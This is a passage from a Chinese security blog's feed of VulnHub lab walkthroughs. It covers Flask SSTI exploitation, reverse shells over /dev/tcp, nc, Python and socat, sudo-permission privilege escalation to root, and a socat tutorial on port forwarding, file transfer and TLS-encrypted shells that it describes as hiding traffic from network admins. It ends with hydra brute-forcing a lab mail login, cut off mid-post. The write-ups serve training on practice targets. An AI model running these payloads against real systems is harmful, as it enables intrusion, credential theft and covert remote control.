class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">.</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">4</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span></span></span></span>s?l333tt=pwd)</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1256.png\" width=\"430\" alt=\"Image\">\n<p>换成其他的参数之后发现回显依旧是输入本身</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1257.png\" width=\"560\" alt=\"Image\">\n<p>利用 wappalyzer 发现网站时 python 写的、用的 flask 框架</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1258.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"ssti模板注入\"><a class=\"markdownIt-Anchor\" href=\"#ssti模板注入\">#</a> SSTI 模板注入</h3>\n<p>既然是 flask 框架，就可以测试 SSTI 模版注入</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=\">http://192.168.31.17:5000/sh4d0w</span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo stretchy=\"false\">?</mo><mi>l</mi><mn>333</mn><mi>t</mi><mi>t</mi><mo>=</mo><mo>&lt;</mo><mo stretchy=\"false\">!</mo><mo>−</mo><mo>−</mo><mi>s</mi><mi>w</mi><mi>i</mi><mi>g</mi><mtext>￼</mtext><mn>2</mn><mo>−</mo><mo>−</mo><mo>&gt;</mo><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mn>192.168.31.17</mn><mo>:</mo><mn>5000</mn><mi mathvariant=\"normal\">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding=\"application/x-tex\">s?l333tt=100](http://192.168.31.17:5000/sh4d0w</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">?</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&lt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mclose\">!</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord\">−</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord\">￼</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mclose\">]</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">.</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">4</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span></span></span></span>s?l333tt=100)</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1259.png\" width=\"520\" alt=\"Image\">\n<p>命令成功被执行，表示 SSTI 模板注入漏洞是存在的，如果不用浏览器进行渗透，用终端进行命令行访问的话需要编码及转义</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9lbmMvdXJsZW5jb2RlLw==\">https://www.bejson.com/enc/urlencode/</span> 上进行 url 编码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1260.png\" width=\"420\" alt=\"Image\">\n<p><code>curl http://192.168.31.17:5000/sh4d0w\\$s?l333tt=%7B%7B10*10%7D%7D</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1261.png\" width=\"470\" alt=\"Image\">\n<p>接下来就用这个模板的漏洞进行反弹 shell，先用最基础的试试<br>\n <code>&#123;% import os %&#125;&#123;&#123;os.system('bash -c \"bash -i >&/dev/tcp/192.168.31.99/4444 >&1\"')&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1262.png\" width=\"520\" alt=\"Image\">\n<p>服务器返回了错误，得换其他的方式</p>\n<h3 id=\"ssti模板注入绕过\"><a class=\"markdownIt-Anchor\" href=\"#ssti模板注入绕过\">#</a> SSTI 模板注入绕过</h3>\n<p>用 url 编码尝试能否绕过</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1263.png\" width=\"620\" alt=\"Image\">\n<p>绕过失败，回显显示错误，shell 没有反弹出来，当然 curl 可能因为编码和转义的原因不太准确，不确定的话可以使用浏览器确认一下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1264.png\" width=\"700\" alt=\"Image\">\n<p>尝试用以下方式执行系统命令 (浏览器会默认对空格、引号等自动 url 编码，直接访问即可)：<br>\n <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls -la').read()&#125;&#125;</code> <br>\n <code>http://192.168.31.17:5000/sh4d0w\\$s?l333tt=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1265.png\" width=\"660\" alt=\"Image\">\n<p>命令执行成功，返回了 ls -al 命令的信息，判断目标站点是否存在 nc、python、bash 等可反弹 shell 的命令</p>\n<p><code>http://192.168.31.17:5000/sh4d0w\\$s?l333tt=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1266.png\" width=\"660\" alt=\"Image\">\n<p>用 nc 来反弹 shell：<br>\n <code>http://192.168.31.17:5000/sh4d0w\\$s?&#123;&#123;%20config.__class__.__init__.__globals__[]%27os%27].popen(%27nc%20192.168.31.99%204444%20-e%20/bin/bash%27).read()%20&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1267.png\" width=\"620\" alt=\"Image\">\n<p>拿到 webshell 之后就是对其进行输出一个标准的 shell，就不多说了</p>\n<h3 id=\"socat反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#socat反弹shell\">#</a> socat 反弹 shell</h3>\n<p>查看 sudo -l 时，看到可以无密码执行 kori 下的一个命令</p>\n<blockquote>\n<p>先无脑用 python 3 尝试一下能否反弹 shell 出来<br>\n <code>sudo -u kori /bin/php /home/kori/jail.php python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31. 99 &quot;,4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n</blockquote>\n<p>反弹失败了，查看 /home/kori/jail.php 文件，发现在 jail.php 文件中基本上能反弹 shell 的命令都给过滤掉了，包括一些特殊字符都不能在使用，我们能否绕过这些过滤信息，一旦绕过过滤，我们所输入的命令就会被执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1268.png\" width=\"630\" alt=\"Image\">\n<blockquote>\n<p>发现服务器上是存在 socat 命令的，socat 可以算做是高级一点的 nc，并且反弹 shell 的时候只需要分号不需要其他的特殊符号的参与，后面详细介绍 socat 的使用方法，这里先把 shell 反弹出来<br>\n <code>nc - lvvp 3335</code> <br>\n <code>sudo -u kori /bin/php /home/kori/jail.php socat exec:'sh',pty,stderr,setsid,sigint,sane</code> <br>\n <code>tcp:192.168.31.99:4445</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1270.png\" width=\"700\" alt=\"Image\">\n<p>反弹后同样先获取一个标准的 tty，查看权限设置时看到了一条命令，可调用 irida 用户用 cp 命令将其用户目录下的 irida.apk 文件拷贝到 kori 下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1271.png\" width=\"560\" alt=\"Image\">\n<h3 id=\"权限设置错误\"><a class=\"markdownIt-Anchor\" href=\"#权限设置错误\">#</a> 权限设置错误</h3>\n<p>直接执行这条命令，看会有什么样的回显产生</p>\n<p><code>sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk</code> <br>\n 发现权限不允许，通过 chmod o+w . 给其他用户添加写权限，再次复制成功了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1272.png\" width=\"520\" alt=\"Image\">\n<p>查看此文件的权限时，发现还是属于 irida 用户，如果我们先用 kori 用户创建 irida.apk 的文件，再将 irida 用户目录下的 apk 文件复制过来，那么最后得到的文件的权限就会归属于 kori 用户<br>\n <code>rm - f irida.apk;touch irida.apk; chmod +777 irida.apk</code> <br>\n <code>sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1273.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"apk反编译\"><a class=\"markdownIt-Anchor\" href=\"#apk反编译\">#</a> apk 反编译</h3>\n<p>将 apk 发送到一台 windows 虚拟机或者主机上，尝试反编译<br>\n <code>scp irida.apk administrator@192.168.31.16:/E:/Desktop</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1274.png\" width=\"520\" alt=\"Image\">\n<p>在 github 上搜索得到 AndroidKiller 一款用来反编译 apk 的工具</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1275.png\" width=\"660\" alt=\"Image\">\n<p>用此工具打开 apk 文件即可自动的进行反编译</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1276.png\" width=\"660\" alt=\"Image\">\n<p>经过一段时间后，apk 被成功反编译为了 jar 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1277.png\" width=\"660\" alt=\"Image\">\n<p>而 jar 文件是可以直接采用 IDEA 打开的，但是打开之后是不允许编辑的，可以借助 IDEA 工具对其源码进行审计，然后复制出关键的信息进行利用</p>\n<h3 id=\"idea反编译jar\"><a class=\"markdownIt-Anchor\" href=\"#idea反编译jar\">#</a> IDEA 反编译 jar</h3>\n<p>在 jar 文件中找到一个登陆数据，调用了一个方法，将该方法的输出结果作为登陆进去的密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1278.png\" width=\"660\" alt=\"Image\">\n<p>拉取这部分的代码，执行构造的代码，反向输出原有的密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1279.png\" width=\"660\" alt=\"Image\">\n<p>得到密码 eye.of.the.tiger (), 并且可依靠此密码登陆到 irida 用户下</p>\n<p>找到 irida 用户的一条用户权限设置错误，可调用 python3 <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1vcmFzLXBrNmhnNDVxLnB5\">执行 oras.py</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1280.png\" width=\"520\" alt=\"Image\">\n<p>但是现在的问题是没有权限去查看 oras.py 到底有什么内容，只能根据执行后的回显结果进行猜测<br>\n <code>sudo /usr/bin/python3 /root/oras.py</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1281.png\" width=\"470\" alt=\"Image\">\n<p>需要输入一个参数，并且错误信息提示我们需要输入的是一个十六进制的数据</p>\n<h3 id=\"python输出hex\"><a class=\"markdownIt-Anchor\" href=\"#python输出hex\">#</a> python 输出 hex</h3>\n<blockquote>\n<p>用 python3 调用十六进制，将 whoami 编码为十六进制<br>\n python3 -c “print (b&quot;whoami”.hex ())&quot; | sudo python3 /root/oras.pyi<br>\npython3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 在命令输出<br>\n一个 whoami 的十六进制数据并将这个数据作为后面那个脚本的输入，字符串中的’b’字符前缀使变量成为字节类型。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1282.png\" width=\"570\" alt=\"Image\">\n<p>这里输了一些命令之后命令被挤掉了，说明 stty 设置的不够严谨，重新 reset 一下，stty 如何设置前面有介绍这里就直接利用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1283.png\" width=\"620\" alt=\"Image\">\n<p>上述命令因为符号转义问题即括号的书写不规范导致命令错误，这里不确定自己的命令是否正确，就分为了两部执行，先打印出十六进制，运行后面的脚本，并把十六进制数据作为后者的输入，正常的写法为</p>\n<p><code>python3 -c &quot;print(b\\&quot;whoami\\&quot;.hex())&quot;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1284.png\" width=\"370\" alt=\"Image\">\n<p>将 whoami 的十六进制数据 77686f616d69 带入脚本中执行，看到报错代码内容为 exec（name），而 print (exec (‘whoami’)) 是错误的语法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1285.png\" width=\"340\" alt=\"Image\">\n<h3 id=\"py-exec执行命令\"><a class=\"markdownIt-Anchor\" href=\"#py-exec执行命令\">#</a> py exec 执行命令</h3>\n<p>搜索 python 的 exec 如何执行，在下图的示例中，可见需要在 exec 中添加的内容为 print（‘Hello World’）的形式</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1286.png\" width=\"520\" alt=\"Image\">\n<p>同样先把 print (‘Hello World’) 转为为十六进制<br>\n <code>python3 -c &quot;print(b\\&quot;print('Hello World')\\&quot;.hex())&quot;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1287.png\" width=\"460\" alt=\"Image\">\n<p>将得到的数据 7072696e74282748656c6c6f20576f726c642729 带入到脚本中执行，执行成功，并且打印出来了 Hello World</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1288.png\" width=\"370\" alt=\"Image\">\n<p>通过 python 命令行引入 os 包，以 os 包下的 system 执行系统命令<br>\n <code>python3 -c &quot;print(b\\&quot;__import__('os').system('whoami')\\&quot;.hex())&quot;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1289.png\" width=\"580\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo python3 /root/oras.py</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">5f5f696d706f72745f5f28276f7327292e73797374656d282777686f616d692729</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1290.png\" width=\"480\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过nc将root的shell反弹出来</span></span><br><span class=\"line\">python3 -c &quot;print(b\\&quot;__import__(&#x27;os&#x27;).system(&#x27;nc -e /bin/bash 192.168.31.99 4446&#x27;)\\&quot;.hex())&quot; | sudo python3 /root/oras.py</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">5f5f696d706f72745f5f28276f7327292e73797374656d28276e63202d65202f62696e2f62617368203139322e3136382e33312e393920343434362729</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1291.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 最终拿到了 root 权限</p>\n<h3 id=\"socat通信\"><a class=\"markdownIt-Anchor\" href=\"#socat通信\">#</a> socat 通信</h3>\n<blockquote>\n<p>socat 功能灵活，除了完成 nc 能完成的所有任务外，还有很多实用的用法：<br>\n基本命令就是：socat [参数] &lt; 地址 1 &gt; &lt; 地址 2 &gt;<br>\n 使用 socat 需要提供两个地址，socat 会将这两个地址的数据流串起来，把第左边地址的输出数据传给右边，同时又把右边输出的数据传到左边。Socat 的主要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如 IP、TCP、UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、Socket 等。</p>\n</blockquote>\n<p><code>socat - - </code>  把标准输入和标准输出对接，输入什么显示什么<br>\n就会对接标准输入和标准输出，类似无参数的 cat 命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1292.png\" width=\"420\" alt=\"Image\">\n<p>网络测试 两台主机到底网络能否联通：<br>\n <code>socat - TCP-LISTEN:8080</code>  终端 1 上启动 server 监听 TCP<br>\n <code>socat - TCP:localhost:8080</code>  终端 2 上启动 client 链接 TCP</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1293.png\" width=\"380\" alt=\"Image\">\n<p>服务端在 TCP-LISTEN 地址后面加了 fork 的参数后，就能同时应答多个链接过来的客户端，每个客户端会 fork 一个进程出来进行通信，加上 reuseaddr 可以防止链接没断开玩无法监听的问题。<br>\n <code>socat - TCP-LISTEN:8080,fork,reuseaddr</code>  # 终端 1 上启动 server<br>\n <code>socat - TCP:localhost:8080</code>  # 终端 2 上启动 client</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1294.png\" width=\"510\" alt=\"Image\">\n<p>socat 也可以用 UDP 进行通信<br>\n <code>socat - UDP-LISTEN:8080</code>  # 终端 1 上启动 server 监听 UDP<br>\n <code>socat - UDP:localhost:8080</code>  # 终端 2 上启动 client 链接 UDP</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1295.png\" width=\"380\" alt=\"Image\">\n<h3 id=\"socat-端口转发\"><a class=\"markdownIt-Anchor\" href=\"#socat-端口转发\">#</a> socat 端口转发</h3>\n<p>在主机上监听 8080 端口，将 8080 端口所有流量转发给远程机器的 80 端口，同时在远程机器上开启一个 web 界面：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1296.png\" width=\"620\" alt=\"Image\">\n<p>使用以下命令，访问 127.0.0.1 的流量都转发到了 1.117.52.219 的 8080 上了<br>\n <code>socat TCP-LISTEN:8080,fork,reuseaddr TCP:1.117.52.219:80</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1297.png\" width=\"620\" alt=\"Image\">\n<p>socat 加上 fork 以后，每次 accept 一个链接都会 fork 出一份来不影响接收其他的新连接，这样 socat 就可以当一个端口转发服务，一直启动在那里。</p>\n<p>本地转发，在 80 端口起一个 python 的 http.server 服务<br>\n将 80 端口的服务转发至本地的 8888 端口<br>\n <code>socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1:80</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1298.png\" width=\"460\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1299.png\" width=\"350\" alt=\"Image\">\n<p>日志信息输出<br>\n <code>socat -d -d tcp-listen:1234 -</code> <br>\n <code>socat -d -d tcp-connect:127.0.0.1:1234 -</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1594.png\" width=\"700\" alt=\"Image\">\n<p>前面两个连续的 -d -d 代表调试信息的输出级别。</p>\n<h3 id=\"socat-文件传输\"><a class=\"markdownIt-Anchor\" href=\"#socat-文件传输\">#</a> socat 文件传输</h3>\n<p>采用 FILE 协议将文件传输到另一台机器</p>\n<p><code>socat -d -d tcp-listen:1234 OPEN:filetransfer.txt,create</code> <br>\n <code>sudo socat -d -d tcp-connect:127.0.0.1:1234 FILE:/etc/passwd</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1300.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"socat-规避防火墙\"><a class=\"markdownIt-Anchor\" href=\"#socat-规避防火墙\">#</a> socat 规避防火墙</h3>\n<blockquote>\n<p>socat 的强大之一在于支持 openssl、可以用于 openssl 连接，这样获取到的反弹 shell 将对网络管理员造成很大的排查难度</p>\n</blockquote>\n<p>创建一个将用于加密连接的证书，我们可以为此使用自签名证书<br>\n <code>openssl req -newkey rsa: 2048 - nodes -keyout cert.key -x509 -days 1000 - out cert.crt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1301.png\" width=\"700\" alt=\"Image\">\n<p>这将会产生两个文件，cert.crt 和 cert.key，需要组合为 pem 文件<br>\n <code>cat cert.key cert.crt &gt; sslkey.pem</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1302.png\" width=\"450\" alt=\"Image\">\n<blockquote>\n<p>现在我们就得到了一个可以用来连接 socat 加密的证书<br>\n当我们使用加密证书的时候，就不再用 tcp 监听链接，而是用的 openssl 监听，<br>\n 因为没有使用有效证书需要添加 verify 标志禁用连接端的证书链校验<br>\n <code>socat -d -d openssl-listen:1234,cert=sslkey.pem,verify=0 -</code> <br>\n <code>socat -d -d openssl-connect:127.0.0.1: 1234 ,verify=0 exec:/bin/bash</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1303.png\" width=\"700\" alt=\"Image\">\n<p>这是一个无法或者很难被网络管理员监控的加密链接，这使得网络管理员更难分析我们的数据</p>\n<h3 id=\"socat-远程登录\"><a class=\"markdownIt-Anchor\" href=\"#socat-远程登录\">#</a> socat 远程登录</h3>\n<p>一个重要的地址类型就是 EXEC 可以执行程序并且把输入输出和另外一个地址串起来，比如服务端：<br>\n <code>socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash</code> <br>\n <code>socat -d -d - TCP:localhost:8080</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1595.png\" width=\"660\" alt=\"Image\">\n<blockquote>\n<p>完善一点可以加些参数：(正)<br>\nsocat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash,pty,stderr<br>\nsocat -d -d file: <code>tty</code> ,raw,echo=0 TCP:localhost:8080</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1304.png\" width=\"620\" alt=\"Image\">\n<blockquote>\n<p>也可以用如下的参数：（反）<br>\nsocat -d -d exec:‘bash -li’,pty,stderr,setsid,sigint,sane TCP:192.168.0.149:8080<br>\nsocat -d -d file: <code>tty</code> ,raw,echo=0 TCP-LISTEN:8080</p>\n</blockquote>\n<blockquote>\n<p>这样可以把 bash 的标准错误重定向给标准输出，并且用终端模式运行。客户端可以像刚才那样登录，但是还可以更高级点，用 tty 的方式访问，这样基本就得到了一个全功能的交互式终端了，可以在里面运行 vim, emacs 之类的程序。</p>\n</blockquote>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/150%20POWERGRID/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/150%20POWERGRID/",
            "title": "VULNHUB 50 POWERGRID",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcG93ZXJncmlkLTEwMSw0ODUv\">https://www.vulnhub.com/entry/powergrid-101,485/</span><br>\n 教程链接地址 1: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pvbmFoX0JhcmUvYXJ0aWNsZS9kZXRhaWxzLzEwNjk2MTQ3Nw==\">https://blog.csdn.net/Jonah_Bare/article/details/106961477</span><br>\n 教程链接地址 2: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3Bvd2VyZ3JpZC0xLTAtMS12dWxuaHViLXdhbGt0aHJvdWdoLw==\">https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 POWERGRID：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1554.png\" width=\"520\" alt=\"Image\">\n<p><code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1555.png\" width=\"620\" alt=\"Image\">\n<p><code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.1 90 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1556.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xOTAv\">http://192.168.0.190/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1557.png\" width=\"620\" alt=\"Image\">\n<p>收集到了三个用户名 deez 1 、p48 和 all 2</p>\n<p>用 common.txt 字典扫了一波，没有扫到有价值的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1558.png\" width=\"660\" alt=\"Image\">\n<p>换了个字典扫了一波，扫到了一个 zmail 的目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1559.png\" width=\"660\" alt=\"Image\">\n<p>访问之后得到了一个登陆页面</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xOTAvem1haWw=\">http://192.168.0.190/zmail</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1560.png\" width=\"620\" alt=\"Image\">\n<p>由于已经有了三个用户名了，是有机会爆破得到密码的</p>\n<h3 id=\"hydra爆破http-get\"><a class=\"markdownIt-Anchor\" href=\"#hydra爆破http-get\">#</a> hydra 爆破 http-get</h3>\n<p>选择模式为 http-get，选取密码为 rockyou.txt 开始爆破<br>\n <code>hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.190 -f http-get /zmail/ -t 64 -f -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1561.png\" width=\"660\" alt=\"Image\">\n<p>第一个用户爆破了 18 万次了还是没有爆破成功，等的有点着急，让这个继续爆破下起，同时在启一个 terminal 跑另外一个爆破选择第二个用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1562.png\" width=\"660\" alt=\"Image\">\n<p><code>hydra -l p48 -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/ -t 64 -f -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1563.png\" width=\"660\" alt=\"Image\">\n<p>在爆破到 12 万次的时候，得到了 p48 的密码 electrico</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1564.png\" width=\"620\" alt=\"Image\">\n<p>一个后台登陆地址，再次用 p48:electrico 登陆到其中成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1565.png\" width=\"620\" alt=\"Image\">\n<p>登陆成功，得到一个邮箱的后台界面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1566.png\" width=\"620\" 